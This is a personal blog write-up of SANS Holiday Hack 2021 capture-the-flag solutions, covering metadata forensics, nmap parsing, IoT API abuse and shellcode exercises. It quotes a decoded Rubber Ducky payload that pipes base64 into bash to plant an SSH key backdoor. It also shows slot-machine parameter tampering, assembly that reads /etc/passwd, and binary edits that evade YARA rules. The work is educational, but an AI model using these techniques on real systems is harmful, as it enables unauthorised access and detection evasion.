---
title: "Some SANS Holiday Hack 2021 Solutions"
date: 2022-01-21T20:06:21-08:00
draft: false
toc: true
comments: true
twitterImage: .png
categories:
- Writeup
- Holiday Hack
---

Here are some of my answers to the SANS Holiday Hack 2021. As usual, it's a
pretty fun and accessible challenge.

Previous writeups:

* {{< xref path="/post/2019/2019-01-15-sans-holiday-hack-2018/" text="SANS Holiday Hack 2018 Solutions" >}}
* {{< xref path="/post/2020/2020-01-15-sans-holiday-hack-2019/" text="Some SANS Holiday Hack 2019 Solutions" >}}
* {{< xref path="/post/2021/2021-01-17-sans-holiday-hack-2020/" text="Some SANS Holiday Hack 2020 Solutions" >}}

<!--more-->

# Note
The only `novel` thing in this blog is how I used local overrides to modify
the webpage JavaScript to solve the
[Santa's Holiday Hero](chimney-scissorsticks---santas-holiday-hero) challenge.
I owe it to the `[redacted]` game team for using gRPC in their companion app so
I used it to debug and modify their client-side JavaScript.

# 1) KringleCon Orientation

* 1a) Talk to Jingle Ringford
* 1b) Get your badge
* 1c) Get the wifi adapter
* 1d) Use the terminal

# 2) Where in the World is Caramel Santaigo?

> Help Tangle Coalbox find a wayward elf in Santa's courtyard. Talk to Piney
> Sappington nearby for hints.

There are some other people around but I want to find this objective first and
go by the numbers. To get there I have to go into Kringlecon on the left, then
take the first right to get in the room with the Splunk challenge and take door
that goes to the courtyard.

## Piney Sappington - Exif Metadata
Someone has tampered with some files. We need to use `exiftool` to figure it
out.

We might need to look at the geotags?

> And, if you help me figure this tampering issue out, I'll give you some hints
> about OSINT, especially associated with geographic locations!

A bunch of docx files with the same timestamp.

The files are based on dates `2021-12-01.docx` and so on. If we extract the
metadata with `exiftool 2021-12-02.docx` we get this in the end of the list
`Modify Date: 2021-12-02 00:00:00`. The tampered files might have been modified
after the date in the filename.

`Modify Date` is the description of the tag. To see the tags we have to use the
`-s` option. `exiftool -s 2021-12-01.docx` and it's `ModifyDate`. Now, we can
only extract `ModifyDate` and `FileName`.

`exiftool -FileName -ModifyDate .` and one file has a different date.

```
./2021-12-21.docx
File Name:      2021-12-21.docx
Modify Date:    2021-12-24 23:59:59z
```

If we do `exiftool -s 2021-12-21.docx` we can see the `LastModifiedBy` tag is
`jack Frost`.

**Answer is:** `2021-12-21.docx`.

We get hints from Piney:

> So anyway, some of the hints use obscure coordinate systems like MGRS and even
> what3words.
>
> In some cases, you might get an image with location info in the metadata. Good
> thing you know how to see that stuff now!
>
> (And they say, for those who don't like gameplay, there might be a way to
> bypass by looking at some flavor of cookie...)
>
> And Clay Moody is giving a talk on OSINT techniques right now!
>
> Oh, and don't forget to learn about your target elf and filter in the
> Interrink system!

## Tangle Coalbox - Caramel Santaigo
Some elves are lost, find them. The sequences are randomized so you might have
gotten different ones.

Investigating:

1. They said, if asked, they would describe their next location in three words
   as "frozen, push, and tamed.
   1. This is a `what3words` clue for the Big Ben clock in London.
2. They were checking the Ofcom frequency table to see what amateur frequencies
   they could use while there.
   1. Ofcom is a regulatory authority for England. Another London clue.
   2. They were dressed for 4.0°C and sunny conditions. They kept checking their
      Slack app.

We can answer one interlink question:

* Preferred social medium: Slack

Possible elves:

* Morcel Nougat
* Ginger Breddie
* Ribb Bonbowford

Let's go to London, England.

1. Buddy, a close friend of the elves, once went on an ice skating date under
   their huge Christmas tree!
    1. This points to New York and is a clue from the movie Elf. Buddy the dog
       skated under a huge Christmas tree in NYC.
2. They sent me this blurry selfie of themself or someone they met:
    1. Purple hat, blue coat?
3. They were dressed for 2.2°C and partly cloudy conditions. The elf mentioned
   something about Stack Overflow and Golang.

Another interlink question:

* Language spoken: Golang.

Possible elves:

* Morcel Nougat

Next stop is New York.

1. Their next waypoint was something like 51.219, 4.402.
    1. These coordinates point to Antwerp, Belgium.
2. They just contacted us from an address in the 81.244.0.0/14 range.
3. They were dressed for 4.0°C and overcast conditions. Oh, I noticed they had a
   Firefly themed phone case.

We can answer another clue although we have the answer:

* Fandom: Firefly.

Let's go to Antwerp.

1. First investigation was "you just missed the elf"
2. Second was, you caught up to the elf.

**Answer:** `Marcel Nougat`.

# 3) Thaw Frost Tower's Entrance

> Turn up the heat to defrost the entrance to Frost Tower. Click on the Items
> tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to
> Greasy Gopherkins outside the tower for tips.

We go all the way back to the "Castle Approach" (initial area after going
through the gate). Go right and you see `Greasy GopherGuts`. Seems like it's a
typo because the clue says to look for `Greasy Gopherkins`.

## Greasy GopherGuts - Grepping for Gold
Needs help parsing nmap output and will give us wi-fi hints.

We have to search `bigscan.gnmap` and answer some questions. It's "greppable" so
we should be able to grep for things.

Answer all the questions in the quizme executable:

### 1. What port does 34.76.1.22 have open?
`62078`

```
$ grep "34.76.1.22" bigscan.gnmap 
Host: 34.76.1.22 ()     Status: Up
Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
```

### 2. What port does 34.77.207.226 have open?
`8080`

```
$ grep "34.77.207.226" bigscan.gnmap 
Host: 34.77.207.226 ()     Status: Up
Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)
```

### 3. How many hosts appear "Up" in the scan?
`26054`

```
$ grep "Status: Up" bigscan.gnmap | wc -l
26054
```

### 4. How many hosts have a web port open?
`15242`

(Let's just use TCP ports 80, 443, and 8080).

```
$ grep -E "(80|443|8080)\/open" bigscan.gnmap | wc -l
14372
```

### 5. How many hosts with status Up have no (detected) open TCP ports?
`402`

This is a math problem. We don't need an extra grep command for this.

There are two types of lines in the file (excluding the first and last lines
which are comments).

1. `Host: 1.2.3.4 ()    Status: Up`
2. `Host: 1.2.3.4 ()    Ports: ...`

We are looking for the number of the hosts without an associated `Ports` line.
So we calculate each and then subtract.

* Number of `Up` lines: 26054.
* Number of `Ports` lines: 15242.
* Answer = 26054 - 25652 = 402.

### 6. What's the greatest number of TCP ports any one host has open?
`12`

Each port line looks like this:

```
Host: 34.76.0.44 ()
   Ports: 135/open/tcp//msrpc///, 137/open/tcp//netbios-ns///,
   139/open/tcp//netbios-ssn///, 3389/open/tcp//ms-wbt-server///
   Ignored State: closed (996)
```

We can grep for `/open` and then only select lines with matches. We can even
store them in a separate line. However, we need to figure out which line has the
most number of `open`s and how many.

```
$ grep -n -o "open" bigscan.gnmap | uniq -c | sort -n
...
12 11871:open
12 20450:open
12 26124:open
12 39743:open
12 43460:open
```

Our hint:

> Scanning for Wi-Fi networks with iwlist will be location-dependent. You may
> need to move around the North Pole and keep scanning to identify a Wi-Fi
> network.
>
> Wireless in Linux is supported by many tools, but iwlist and iwconfig are
> commonly used at the command line.
>
> The curl utility can make HTTP requests at the command line!
>
> By default, curl makes an HTTP GET request. You can add --request POST as a
> command line argument to make an HTTP POST request.
>
> When sending HTTP POST, add --data-binary followed by the data you want to
> send as the POST body.

## Grimy McTrollkins - Thaw Frost Tower
There's another char standing near the door named `Grimy McTrollkins`.

```
I think we can melt the door open if we can just get access to the thermostat
inside the building.

That thermostat uses Wi-Fi. And I'll bet you picked up a Wi-Fi adapter for your
badge when you got to the North Pole.

Click on your badge and go to the Items tab. There, you should see your Wi-Fi
Dongle and a button to “Open Wi-Fi CLI.” That'll give you command-line interface
access to your badge's wireless capabilities.
```

Let's open the Wi-Fi CLI near the door.

We need to find the interface, it's `wlan0`.

```
$ iwconfig
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=22 dBm   
          Retry:off   RTS thr:off   Fragment thr=7 B   
          Power Management:on
```

Now, we can scan for networks and find one named `FROST-Nidus-Setup`.

```
$ iwlist wlan0 scan
wlan0     Scan completed :
          Cell 01 - Address: 02:4A:46:68:69:21
                    Frequency:5.2 GHz (Channel 40)
                    Quality=48/70  Signal level=-62 dBm  
                    Encryption key:off
                    Bit Rates:400 Mb/s
                    ESSID:"FROST-Nidus-Setup"
```

We can connect to it.

```
$ iwconfig wlan0 essid "FROST-Nidus-Setup"

** New network connection to Nidus Thermostat detected! Visit
http://nidus-setup:8080/ to complete setup (The setup is compatible with the
'curl' utility)
```

Let's see the page.

```
$ curl http://nidus-setup:8080
◈──────────────────────────────────────────────────────────────────────────────◈
Nidus Thermostat Setup
◈──────────────────────────────────────────────────────────────────────────────◈

WARNING Your Nidus Thermostat is not currently configured! Access to this
device is restricted until you register your thermostat » /register. Once you
have completed registration, the device will be fully activated.

In the meantime, Due to North Pole Health and Safety regulations
42 N.P.H.S 2600(h)(0) - frostbite protection, you may adjust the temperature.

API

The API for your Nidus Thermostat is located at http://nidus-setup:8080/apidoc
```

We need to see the API docs at http://nidus-setup:8080/apidoc and figure out how
to either register or change the temperature.

```
$ curl http://nidus-setup:8080/apidoc
◈──────────────────────────────────────────────────────────────────────────────◈
Nidus Thermostat API
◈──────────────────────────────────────────────────────────────────────────────◈

The API endpoints are accessed via:

http://nidus-setup:8080/api/<endpoint>

Utilize a GET request to query information; for example, you can check the
temperatures set on your cooler with:

curl -XGET http://nidus-setup:8080/api/cooler

Utilize a POST request with a JSON payload to configuration information; for
example, you can change the temperature on your cooler using:

curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": -40}' \
  http://nidus-setup:8080/api/cooler


* WARNING: DO NOT SET THE TEMPERATURE ABOVE 0! That might melt important furniture

Available endpoints

┌─────────────────────────────┬────────────────────────────────┐
│ Path                        │ Available without registering? │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/cooler                 │ Yes                            │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/hot-ice-tank           │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/snow-shower            │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/melted-ice-maker       │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/frozen-cocoa-dispenser │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/toilet-seat-cooler     │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/server-room-warmer     │ No                             │ 
└─────────────────────────────┴────────────────────────────────┘
```

The current temperature is:

```json
$ curl -XGET http://nidus-setup:8080/api/cooler
{
  "temperature": -39.2,
  "humidity": 87.84,
  "wind": 8.69,
  "windchill": -49.28
}
```

We can adjust the temperature without registering. The page has an example:

```
curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": -40}' \
  http://nidus-setup:8080/api/cooler
```

Change the temperature to anything over 0?.

```json
$ curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": 1}' \
  http://nidus-setup:8080/api/cooler
{
  "temperature": 1.23,
  "humidity": 86.19,
  "wind": 6.27,
  "windchill": -0.71,
  "WARNING": "ICE MELT DETECTED!"
}
```

And it works! The door is open.

# 4) Slot Machine Investigation

> Test the security of Jack Frost's slot machines. What does the Jack Frost
> Tower casino security team threaten to do when your coin total exceeds 1000?
> Submit the string in the server data.response element. Talk to Noel Boetie
> outside Santa's Castle for help.

Slot machines are at https://slots.jackfrosttower.com/. Will need to proxy the
requests.

## Noel Boetie - Logic Munchers
Let's talk to "Noel Boetie" first. He is just to the right of the castle
entrance in Castle Approach (to the left of where we are).

> I need some help, though. If you can show me how to complete a stage in
> Potpourri at the Intermediate (Stage 3) or higher, I'll give you some hints
> for how to find vulnerabilities.
>
> Specifically, I'll give you some tips in finding flaws in some of the web
> applications I've heard about here at the North Pole, especially those
> associated with slot machines!

Just go around and chump true statements. Trolldogs will alter statements after
going through them so watch out for those. Nothing groundbreaking here. We get
hints after completing the level 3 challenge (I did not do the rest):

> It seems they're susceptible to [parameter tampering][param-tampering].
>
> You can modify web request parameters with an intercepting proxy or tools
> built into Firefox.

[param-tampering]: https://owasp.org/www-community/attacks/Web_Parameter_Tampering

## Slot Machine
https://slots.jackfrosttower.com

Spin is a POST request. We can modify the `cpl` to a negative amount and we get
extra credits when we spin and do not win.

```
POST /api/v1/{{GUID}}/spin HTTP/2
Host: slots.jackfrosttower.com

betamount=0.1&numline=1&cpl=-10000
```

The response has this message which is the answer. We have to enter it in the
objectives screen:

`"response":"I'm going to have some bouncer trolls bounce you right out of this casino!"`

# 5) Strange USB Device

> Assist the elves in reverse engineering the strange USB device. Visit Santa's
> Talks Floor and hit up Jewel Loggins for advice.

The talks floor is in the castle. Use the elevator to go to level 2. There's an
elf standing by so there's probably another challenge there but for now I am
gonna skip it because I want to do the objectives in sequence.

## Jewel Loggins - IPv6 Sandbox
`PieceOnEarth`

> So now I'm trying to do simple things like Nmap and cURL using IPv6, and I
> can't quite get them working!
>
> I think there's a [Github Gist][gist-ipv6] that covers tool usage with IPv6
> targets.
>
> The tricky parts are knowing when to use [] around IPv6 addresses and where to
> specify the source interface.
>
> I've got a deal for you. If you show me how to solve this terminal, I'll
> provide you with some nice tips about a topic I've been researching a lot
> lately – Ducky Scripts! They can be really interesting and fun!

[gist-ipv6]: https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f

Using the gist we can start looking for local IP addresses:

`ping6 ff02::1 -c2` and `ping6 ff02::2 -c2` give us some results that we can see
with `ip neigh`:

I cannot copy text out of the terminal so hopefully this is correct.

```
fe80::1 dev eth0 lladdr 02:42:c0:a8:a0:03 REACHABLE // this appears to be us?
fe80::42::c0ff:fea8:a002 dev eth0 lladdr 02:42:c0:a8:a0:02 REACHABLE
```

We can ping it `ping fe80::42::c0ff:fea8:a002 -I eth0` and then run `nmap`:

```
nmap -6 fe80::42::c0ff:fea8:a002%eth0

// I cannot copy/paste 
Ports 80 and 9000 TCP are open.
```

Sometimes we cannot reach the host because the IP is now STALE and we have to
redo the `pin6` commands. If you run `ip neigh` you should see `STALE` in front
of it.

Let's look at port 80. 

```
curl http://[fe80::42::c0ff:fea8:a002]:80/ --interface eth0

Connect to the other open TCP port to get the striper's activation phrase!
```

We can use netcat to connect to port 9000.

```
$ nc fe80::42::c0ff:fea8:a002%eth0 9000

PieceOnEarth
```

Note to self: Have to enter this in the top panel to get the achievement.

Hint from Jewel

> A troll could program a keystroke injector to deliver malicious keystrokes
> when it is plugged in.
>
> Ducky Script is a language used to specify those keystrokes.
>
> What commands would a troll try to run on our workstations?
>
> I heard that [SSH keys can be used as backdoors][ssh-backdoor]. Maybe that's
> useful?

[ssh-backdoor]: https://attack.mitre.org/techniques/T1098/004/

The link has this quote:

> Adversaries may modify SSH authorized_keys files directly with scripts or
> shell commands to add their own adversary-supplied public keys. This ensures
> that an adversary possessing the corresponding private key may log in as an
> existing user via SSH.

## Morcel Nougat - Strange USB Device
`ickymcgoop`

The strange USB device is in the speaker's room. Go all the way to the left on
the same floor as the previous challenge.

> Say, do you know anything about USB Rubber Duckies?
>
> I've been playing around with them a bit myself.
>
> Please see what you can do to help solve the Rubber Ducky Objective!
>
> Oh, and if you need help, I hear Jewel Loggins, on this floor outside this
> room, has some experience.

We need to evaluate the USB data in `/mnt/USBDEVICE`. There is a Python script
in home named `mallard.py` which appears to contain the ducky script for
converting keystrokes to text (?).

Looking inside [mallard.py](mallard.py) was useless, I could have just ran
`./mallard.py -h` to see the switches.

```
usage: mallard.py [-h] [--file FILE] [--no_analyze] [--output_file OUTPUT_FILE]
                  [--analysis_file ANALYSIS_FILE] [--debug]

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  The file to decode, default: inject.bin
  --no_analyze, -A      Include this switch to turn off analysis of the duckyfile
  --output_file OUTPUT_FILE, -o OUTPUT_FILE
                        File to save decoded ducky script to. Default will print duckyfile to
                        screen.
  --analysis_file ANALYSIS_FILE
                        Location to output analysis. Default will print analysis to screen.
  --debug               Enable Debug Logging.
```

Target file is `/mnt/USBDEVICE/inject.bin`. The `-o` option does not seem to
work but we can do `./mallard.py -f /mnt/USBDEVICE/inject.bin` to see the
output.

This is there

```
STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4Wd
   mxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRV
   NFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ
   0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1G
   ZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
```

We can run the same command minus the last part (`bash`) to see the result.

```
echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG
   5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGl
   MRnJhdWdST2FSaWZSaXBKcUZmUHAK
   ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
```

We can see `ickymcgoop@trollfun.jackfrosttower.com`. The answer is `ickymcgoop`.

# 6) Shellcode Primer

> Complete the Shellcode Primer in Jack's office. According to the last
> challenge, what is the secret to KringleCon success? "All of our speakers and
> organizers, providing the gift of ____, free to the community." Talk to
> Chimney Scissorsticks in the NetWars area for hints.

Shellcode primer is at: https://tracer.kringlecastle.com/

Let's go find Chimney Scissorsticks. Netwars is the last button on the elevator.

## Chimney Scissorsticks - Santa's Holiday Hero

> It's more fun to play with a friend but I've also heard there's a clever way
> to enable single player mode.
>
> Single player mode? I heard it can be enabled by fiddling with two client-side
> values, one of which is passed to the server.
>
> It's so much more fun and easier with a friend though!
>
> Either way, we'd really appreciate your help getting the sleigh all fueled up.
>
> Then I can get back to thinking about shellcode...

So we have to enable single player mode by modifying things that go from the
client.

Cookie `HOHOHO={"single_player":false}` and let's try to change it to true and
see what happens with match/replace.

* Match: `%7B%22single_player%22%3Afalse%7D`
* Replace: `%7B%22single_player%22%3Atrue%7D`

We can also use the browser DevTools. `Storage (tab) > Cookies >
https://hero.kringlecastle.com` and set the `HOHOHO` cookie to
`%7B%22single_player%22%3Atrue%7D`

But this is not enough to finish the game in single player mode.

Let's prettify and look at the file [holidayhero.min.js](holidayhero.min.js) in
VS Code.

There's a variable `single_player_mode = !1,`. Let's set it to `true` and see
what happens.

I used the local override in Chrome/Edge and set it to true. Now, the other
place is automagically played by the game and I need to only play one side.

https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide-chromium/javascript/overrides

Hint from Chimney

> If you run into any shellcode primers at the North Pole, be sure to read the
> directions and the comments in the shellcode source!
>
> Also, troubleshooting shellcode can be difficult. Use the debugger
> step-by-step feature to watch values.
>
> Lastly, be careful not to overwrite any register values you need to reference
> later on in your shellcode.

## Shellcode Primer
We can get to the primer without going to Jack's Office. It's at
https://tracer.kringlecastle.com/.

Answer is `cyber security knowledge`.

### 5. System Calls

```asm
; TODO: Find the syscall number for sys_exit and put it in rax
mov rax, 60

; TODO: Put the exit_code we want (99) in rdi
mov rdi, 99

; Perform the actual syscall
syscall
```

### 7. Getting RIP

```asm
; Remember, this call pushes the return address to the stack
call place_below_the_nop

; This is where the function *thinks* it is supposed to return
nop

; This is a 'label' - as far as the call knows, this is the start of a function
place_below_the_nop:

; TODO: Pop the top of the stack into rax
pop rax

; Return from our code, as in previous levels
ret
```

### 8. Hello, World!

```asm
; This would be a good place for a call
call after_hello_world

; This is the literal string 'Hello World', null terminated, as code. Except
; it'll crash if it actually tries to run, so we'd better jump over it!
db 'Hello World',0

; This would be a good place for a label and a pop
after_hello_world:
pop rax

; This would be a good place for a re... oh wait, it's already here. Hooray!
ret
```

### 9. Hello World!!
The only trick here was not printing the terminating null byte in the string. So
only need to print 12 bytes and not the end.

```asm
; TODO: Get a reference to this string into the correct register
call hello_world

db 'Hello World!',0

hello_world:
pop rbx  ; store a pointer to the string in rbx
; we could have just done pop rsi

; Set up a call to sys_write
; TODO: Set rax to the correct syscall number for sys_write
mov rax, 1

; TODO: Set rdi to the first argument (the file descriptor, 1)
mov rdi, 1

; TODO: Set rsi to the second argument (buf - this is the "Hello World" string)
mov rsi, rbx

; TODO: Set rdx to the third argument (length of the string, in bytes)
mov rdx, 12 ; we should not print the terminating null byte here, I got an error when I did it

; Perform the syscall
syscall

; Return cleanly
ret
```

### 10. Opening a File
Nothing new here, just a different syscall that opens a file.

```asm
; TODO: Get a reference to this string into the correct register
call passwd

db '/etc/passwd',0

passwd:
pop rbx  ; store a pointer to the string in rbx
; could have done `pop rdi`

; Set up a call to sys_open
; TODO: Set rax to the correct syscall number
mov rax, 2

; TODO: Set rdi to the first argument (the filename)
mov rdi, rbx

; TODO: Set rsi to the second argument (flags - 0 is fine)
mov rsi , 0

; TODO: Set rdx to the third argument (mode - 0 is also fine)
mov rdx, 0

; Perform the syscall
syscall

; syscall sets rax to the file handle, so to return the file handle we don't
; need to do anything else!
ret
```

### 11. Reading a File

```asm
; TODO: Get a reference to this
call file_name

db '/var/northpolesecrets.txt',0

file_name:
pop rbx

; TODO: Call sys_open
; we can use the code from #10 here.
mov rax, 2   ; Set rax to the syscall number for sys_open
mov rdi, rbx ; Set rdi to the first argument (the filename)
mov rsi, 0   ; Set rsi to the second argument (flags - 0 is fine)
mov rdx, 0   ; Set rdx to the third argument (mode - 0 is also fine)
syscall      ; Perform the syscall, now rax contains a handle to the file

mov rbx, rax ; store the file descriptor returned by sys_open

; TODO: Call sys_read on the file handle and read it into rsp
mov rax, 0    ; Set rax to the correct syscall number for sys_read
mov rdi, rbx  ; Set rdi to the first argument (the file descriptor from sys_open)
mov rsi, rsp  ; Set rsi to the second argument (address in memory to save the input, using rsp for this)
mov rdx, 1000 ; Set rdx to the third argument (maximum number of characters to accept, we need to experiment with this)
syscall       ; Perform the syscall, now rax contains the number of bytes that were read

mov rbx, rax  ; store the number of bytes that were read in rbx

; TODO: Call sys_write to write the contents from rsp to stdout (1)
mov rax, 1    ; Set rax to the correct syscall number for sys_write
mov rdi, 1    ; Set rdi to the first argument (the file descriptor for stdout is 1)
mov rsi, rsp  ; Set rsi to the second argument (buf - this is the bytes read from the file now in rsp)
mov rdx, rbx  ; Set rdx to the third argument (length of the string in bytes that we got from sys_read)
syscall       ; Perform the syscall

; TODO: Call sys_exit from #5
mov rax, 60 ; Set rax to the correct syscall number for sys_exit
mov rdi, 99 ; Put the exit_code we want (99) in rdi
syscall     ; Perform the syscall
```

We read this text:

> Secret to KringleCon success: all of our speakers and organizers, providing
> the gift of cyber security knowledge, free to the community.

Answer is `cyber security knowledge`.

# 7) Printer Exploitation

> Investigate the stolen Kringle Castle printer. Get shell access to read the
> contents of `/var/spool/printer.log`. What is the name of the last file
> printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help
> with this objective.

Link to Kringle Castle printer: https://printer.kringlecastle.com/

## Frostavator
The shellcode was in Jack Frost's room but we could access it without going
there. Ruby who has the hint for this challenge is there, too. It's time to use
the elevator in the Frost tower to get up there. We see `Grody Goiterson`
standing there.

> So hey, this is the Frostavator. It runs on some logic chips... that fell out.
>
> I put them back in, but I must have mixed them up, because it isn't working now.
>
> If you help me run the elevator, maybe I can help you with something else.
>
> I'm pretty good with FPGAs, if that's worth something to ya'.

Clicking on the elevator shows a label that says residential floors are
inaccessible.

![](frostavator-01.jpg)

We can click on `Open Panel` to see the inside and solve a puzzle with logic
gates.

![](frostavator-02.jpg)

Randomly swap the gates until it works.

![](frostavator-03.jpg)

Now, we can click on the `Jack's Office` or `Talks` button.

## Ruby Cyster - Printer Exploitation
Use the frostavator to get to Jack's office.

> So first things first, you should definitely take a look at the firmware.
>
> With that in-hand, you can pick it apart and see what's there.
>
> Did you know that if you append multiple files of that type, the last one is
> processed?
>
> Have you heard of [Hash Extension Attacks][hash-extension]?
>
> If something isn't working, be sure to check the output! The error messages
> are very verbose.
>
> Everything else accomplished, you just might be able to get shell access to
> that dusty old thing!

[hash-extension]: https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks

Clicking on the printer there also opens up https://printer.kringlecastle.com/.

Clicking on `more details` opens `/SuppliesStatus` and returns an error.

```
Something went wrong!

Error in /app/lib/app.rb: Route not found: GET /SuppliesStatus
```

Another similar route:

```
Something went wrong!

Error in /app/lib/app.rb: Route not found: GET /incoming/
```

Click on `Settings` will open https://printer.kringlecastle.com/config and every
link goes to `/login`. Login needs a password and sends this POST request

```
POST /login HTTP/2
Host: printer.kringlecastle.com

password=123456
```

And the result says login is disabled. `Reports` is similar, everything either
goes to `/config` or `/login`.

`Firmware` is the place to go. We can upload a firmware AND we can also download
the current one for analysis.

The firmware is a JSON file. See the beautified version in
[firmware-export.json](firmware-export.json).

```json
{
    "firmware": "base64-blob",
    "signature": "e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23",
    "secret_length": 16,
    "algorithm": "SHA256"
}
```

It's signed. We can probably bypass the signing and include our own firmware by
appending our own JSON object to this and uploading.

But let's see what's inside `firmware` with Cyberchef.

1. After base64 decode the blob starts with `PK` which means it's a zip file.
2. If we unzip it we get an ELF file.

Reading the [Hash Extension Attacks][hash-extension] blog we find a tool
[hash_extender][hash_extender-github] that can append data to the end what's
signed without changing the hash.

[hash_extender-github]: https://github.com/iagox86/hash_extender

### Building hash_extender on WSL
We just need to install `libssl-dev` and then run the `make` file.

```
$ sudo apt-get install libssl-dev
$ make
 [CC] hash_extender_engine.o
 [CC] formats.o
 [LD] hash_extender
 [CC] hash_extender_test.o
 [LD] hash_extender_test
```

Now we can run `./hash_extender`.

### What Should We Append?
Ruby has this hint

> Did you know that if you append multiple files of that type, the last one is
> processed?

SKIPPING THIS FOR NOW.

This means we can either append a second ELF (or a bash file) or second zip file
to the firmware and upload it. Let's try both and see what happens. Apparently,
the error messages should tell us what we did wrong.

We need to get `/var/spool/printer.log`, should we add a route in the file below
and just paste the file there?

```
Something went wrong!

Error in /app/lib/app.rb: Route not found: GET /SuppliesStatus
```

**Did wisdom teeth surgery at this point and the rest of the break was spent
dealing with that.**

----------

# 9) Splunk!

> Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy
> Shortstack is in Santa's lobby, and he knows a few things about Splunk. What
> does Santa call you when when you complete the analysis?

Answer: `whiz`.

## Fitzy Shortstack - Yara Analysis
Fitzy is in `Kringlecon > Entry`.

> OK. I AM worried. I've been thinking a bit about how malware might bypass YARA
> rules.
> 
> I think if you make small, innocuous changes to the executable, you can get it
> to run in spite of the YARA rules.

We need to:

1. Figure out which Yara rule is preventing the executable from running.
2. Modify it so it runs.
3. Tools needed are vim, emacs, nano, yara, and xxd.

```
$ ./the_critical_elf_app 
yara_rule_135 ./the_critical_elf_app
```

It's rule 135.

```yaml
rule yara_rule_135 {
   meta:
      description = "binaries - file Sugar_in_the_machinery"
      author = "Sparkle Redberry"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-21"
      hash = "19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488"
   strings:
      $s = "candycane"
   condition:
      $s
}
```

Looking at docs we can see this is a case-sensitive string, maybe we can change
the case or just change the complete string in the binary?

We can find the offset with `strings -o`:

```
$ strings -t d the_critical_elf_app
// -t d: print the offset in decimal.
// -o here prints it in octal (equivalent of `-t o`), some versions of the
// utility print the offset in decimal with `-o` instead, not this version.
  ...
   8200 candycane
   8210 naughty string
   8232 This is critical for the execution of this program!!
   8288 HolidayHackChallenge{NotReallyAFlag}
   8325 dastardly string
   8487 :*3$"
  ...

// or in hex with `-t x`
   2008 Candycane
   2012 naughty string
   2028 This is critical for the execution of this program!!
   2060 HolidayHackChallenge{NotReallyAFlag}
   2085 dastardly string
```

See the output in
[strings-the_critical_elf_app.txt](strings-the_critical_elf_app.txt).

We can also use `xxd` to see the dump.

```
$ xxd -s 8200 -l 200 the_critical_elf_app
// -s: seek, start from this offset.
// -l: length of the chunk to dump.

00002008: 6361 6e64 7963 616e 6500 6e61 7567 6874  candycane.naught
00002018: 7920 7374 7269 6e67 0000 0000 0000 0000  y string........
00002028: 5468 6973 2069 7320 6372 6974 6963 616c  This is critical
00002038: 2066 6f72 2074 6865 2065 7865 6375 7469   for the executi
00002048: 6f6e 206f 6620 7468 6973 2070 726f 6772  on of this progr
00002058: 616d 2121 0000 0000 486f 6c69 6461 7948  am!!....HolidayH
00002068: 6163 6b43 6861 6c6c 656e 6765 7b4e 6f74  ackChallenge{Not
00002078: 5265 616c 6c79 4146 6c61 677d 0064 6173  ReallyAFlag}.das
00002088: 7461 7264 6c79 2073 7472 696e 6700 0000  tardly string...
00002098: 011b 033b 3c00 0000 0600 0000 88ef ffff  ...;<...........
000020a8: 7000 0000 98ef ffff 9800 0000 a8ef ffff  p...............
000020b8: 5800 0000 91f0 ffff b000 0000 b8f0 ffff  X...............
000020c8: d000 0000 28f1 ffff                      ....(...
```

Let's modify the binary and change the case. We can use Vim (augh).

1. `vim the_critical_elf_app` to open the app.
2. Enter the `:%!xxd` command. This will convert the file to a
   hexdump inside Vim.
3. Press PgDn to get to the string offset. Press `insert` twice to enter
   `replace` mode.
4. Modify `63` which is `c` to `43` (`C`). We just need to replace `6` with `4`.
5. Press escape and then `:` to enter a command.
6. Enter `:%!xxd -r` to convert the file back to hex.
7. Save and exit with `:wq`.

Running the file we get another rule alert. Seems like end up changing most of
those strings.

```
$ ./the_critical_elf_app 
yara_rule_1056 ./the_critical_elf_app
```

Unfortunately, we cannot use `ctrl+w` inside nano to search because the browser
will try to close the page. I used Vim (augh) again. Press escape, then `/`,
then enter you search term, and press `enter`. Press `enter` again to switch to
that location in the file.

```yaml
rule yara_rule_1056 {
   meta:
        description = "binaries - file frosty.exe"
        author = "Sparkle Redberry"
